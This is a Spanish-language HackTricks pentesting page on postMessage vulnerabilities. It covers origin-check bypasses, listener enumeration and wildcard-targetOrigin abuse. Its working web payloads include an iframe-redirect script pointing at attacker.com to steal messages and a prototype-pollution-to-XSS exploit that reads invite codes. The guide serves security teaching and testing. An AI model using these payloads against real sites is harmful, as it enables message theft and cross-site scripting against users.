# Vulnerabilidades de PostMessage

## Vulnerabilidades de PostMessage

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci√≥n**](https://github.com/sponsors/carlospolop)!
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}


## Enviar **PostMessage**

**PostMessage** utiliza la siguiente funci√≥n para enviar un mensaje:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Note que **targetOrigin** puede ser un '\*' o una URL como _https://company.com._\
En el **segundo escenario**, el **mensaje solo puede ser enviado a ese dominio** (incluso si el origen del objeto window es diferente).\
Si se utiliza el **comod√≠n**, **los mensajes podr√≠an ser enviados a cualquier dominio**, y se enviar√°n al origen del objeto Window.

### Ataque a iframe y comod√≠n en **targetOrigin**

Como se explica en [**este informe**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/), si encuentras una p√°gina que puede ser **iframed** (sin protecci√≥n `X-Frame-Header`) y que est√° **enviando mensajes sensibles** a trav√©s de **postMessage** utilizando un **comod√≠n** (\*), puedes **modificar** el **origen** del **iframe** y **filtrar** el **mensaje sensible** a un dominio controlado por ti.\
Ten en cuenta que si la p√°gina puede ser iframed pero el **targetOrigin** est√° **configurado a una URL y no a un comod√≠n**, este **truco no funcionar√°**.
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## explotaci√≥n de addEventListener

**`addEventListener`** es la funci√≥n utilizada por JS para declarar la funci√≥n que est√° **esperando `postMessages`**.\
Se utilizar√° un c√≥digo similar al siguiente:
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
Nota en este caso c√≥mo la **primera cosa** que hace el c√≥digo es **verificar el origen**. Esto es terriblemente **importante** principalmente si la p√°gina va a hacer **algo sensible** con la informaci√≥n recibida (como cambiar una contrase√±a). **Si no verifica el origen, los atacantes pueden hacer que las v√≠ctimas env√≠en datos arbitrarios a estos endpoints** y cambiar las contrase√±as de las v√≠ctimas (en este ejemplo).

### Enumeraci√≥n

Para **encontrar oyentes de eventos** en la p√°gina actual puedes:

* **Buscar** en el c√≥digo JS `window.addEventListener` y `$(window).on` (_versi√≥n de JQuery_)
* **Ejecutar** en la consola de herramientas de desarrollo: `getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1).png>)

* **Ir a** _Elementos --> Oyentes de Eventos_ en las herramientas de desarrollo del navegador

![](<../../.gitbook/assets/image (396).png>)

* Usar una **extensi√≥n de navegador** como [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) o [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Estas extensiones de navegador **interceptar√°n todos los mensajes** y te los mostrar√°n.

### Bypass de verificaci√≥n de origen

* El atributo **`event.isTrusted`** se considera seguro ya que devuelve `True` solo para eventos que son generados por acciones genuinas del usuario. Aunque es dif√≠cil de eludir si se implementa correctamente, su importancia en las verificaciones de seguridad es notable.
* El uso de **`indexOf()`** para la validaci√≥n de origen en eventos de PostMessage puede ser susceptible a eludir. Un ejemplo que ilustra esta vulnerabilidad es:

```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")
```
* El m√©todo **`search()`** de `String.prototype.search()` est√° destinado a expresiones regulares, no a cadenas. Pasar cualquier cosa que no sea una regexp lleva a una conversi√≥n impl√≠cita a regex, haciendo que el m√©todo sea potencialmente inseguro. Esto se debe a que en regex, un punto (.) act√∫a como un comod√≠n, permitiendo eludir la validaci√≥n con dominios especialmente dise√±ados. Por ejemplo:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```
* La funci√≥n **`match()`**, similar a `search()`, procesa regex. Si la regex est√° mal estructurada, podr√≠a ser propensa a eludir.
* La funci√≥n **`escapeHtml`** est√° destinada a sanitizar entradas escapando caracteres. Sin embargo, no crea un nuevo objeto escapado, sino que sobrescribe las propiedades del objeto existente. Este comportamiento puede ser explotado. En particular, si un objeto puede ser manipulado de tal manera que su propiedad controlada no reconozca `hasOwnProperty`, el `escapeHtml` no funcionar√° como se espera. Esto se demuestra en los ejemplos a continuaci√≥n:

* Fallo esperado:

```javascript
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
```
* Eludiendo la escapatoria:

```javascript
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```

En el contexto de esta vulnerabilidad, el objeto `File` es notablemente explotable debido a su propiedad `name` de solo lectura. Esta propiedad, cuando se usa en plantillas, no es sanitizada por la funci√≥n `escapeHtml`, lo que lleva a posibles riesgos de seguridad.
* La propiedad `document.domain` en JavaScript puede ser establecida por un script para acortar el dominio, permitiendo una aplicaci√≥n m√°s relajada de la pol√≠tica de mismo origen dentro del mismo dominio padre.

### e.origin == window.origin bypass

Al incrustar una p√°gina web dentro de un **iframe sandboxed** usando %%%%%%, es crucial entender que el origen del iframe se establecer√° en null. Esto es particularmente importante al tratar con **atributos sandbox** y sus implicaciones en la seguridad y funcionalidad.

Al especificar **`allow-popups`** en el atributo sandbox, cualquier ventana emergente abierta desde dentro del iframe hereda las restricciones sandbox de su padre. Esto significa que a menos que el atributo **`allow-popups-to-escape-sandbox`** tambi√©n est√© incluido, el origen de la ventana emergente se establece de manera similar en `null`, aline√°ndose con el origen del iframe.

En consecuencia, cuando se abre una ventana emergente bajo estas condiciones y se env√≠a un mensaje desde el iframe a la ventana emergente usando **`postMessage`**, ambos extremos, el de env√≠o y el de recepci√≥n, tienen sus or√≠genes establecidos en `null`. Esta situaci√≥n lleva a un escenario donde **`e.origin == window.origin`** eval√∫a como verdadero (`null == null`), porque tanto el iframe como la ventana emergente comparten el mismo valor de origen de `null`.

Para m√°s informaci√≥n **lee**:

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### Eludir e.source

Es posible verificar si el mensaje provino de la misma ventana en la que el script est√° escuchando (especialmente interesante para **Scripts de Contenido de extensiones de navegador** para verificar si el mensaje fue enviado desde la misma p√°gina):
```javascript
// If it‚Äôs not, return immediately.
if( received_message.source !== window ) {
return;
}
```
Puedes forzar **`e.source`** de un mensaje a ser nulo creando un **iframe** que **env√≠a** el **postMessage** y es **inmediatamente eliminado**.

Para m√°s informaci√≥n **lee:**

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### Bypass de X-Frame-Header

Para realizar estos ataques, idealmente podr√°s **poner la p√°gina web de la v√≠ctima** dentro de un `iframe`. Pero algunos encabezados como `X-Frame-Header` pueden **prevenir** ese **comportamiento**.\
En esos escenarios, a√∫n puedes usar un ataque menos sigiloso. Puedes abrir una nueva pesta√±a a la aplicaci√≥n web vulnerable y comunicarte con ella:
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Robando mensajes enviados al hijo bloqueando la p√°gina principal

En la siguiente p√°gina puedes ver c√≥mo podr√≠as robar un **sensible postmessage data** enviado a un **child iframe** al **bloquear** la **p√°gina** **principal** antes de enviar los datos y abusar de un **XSS en el hijo** para **leak the data** antes de que sea recibido:

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### Robando mensajes modificando la ubicaci√≥n del iframe

Si puedes iframe una p√°gina web sin X-Frame-Header que contenga otro iframe, puedes **cambiar la ubicaci√≥n de ese child iframe**, as√≠ que si est√° recibiendo un **postmessage** enviado usando un **wildcard**, un atacante podr√≠a **cambiar** ese iframe **origin** a una p√°gina **controlada** por √©l y **steal** el mensaje:

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### postMessage a Prototype Pollution y/o XSS

En escenarios donde los datos enviados a trav√©s de `postMessage` son ejecutados por JS, puedes **iframe** la **p√°gina** y **exploit** la **prototype pollution/XSS** enviando el exploit a trav√©s de `postMessage`.

Un par de **muy buenos explicados XSS a trav√©s de `postMessage`** se pueden encontrar en [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)

Ejemplo de un exploit para abusar de **Prototype Pollution y luego XSS** a trav√©s de un `postMessage` a un `iframe`:
```html
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
Para **m√°s informaci√≥n**:

* Enlace a la p√°gina sobre [**contaminaci√≥n de prototipos**](../deserialization/nodejs-proto-prototype-pollution/)
* Enlace a la p√°gina sobre [**XSS**](../xss-cross-site-scripting/)
* Enlace a la p√°gina sobre [**contaminaci√≥n de prototipos del lado del cliente a XSS**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss)

## Referencias

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* Para practicar: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)


{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci√≥n**](https://github.com/sponsors/carlospolop)!
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
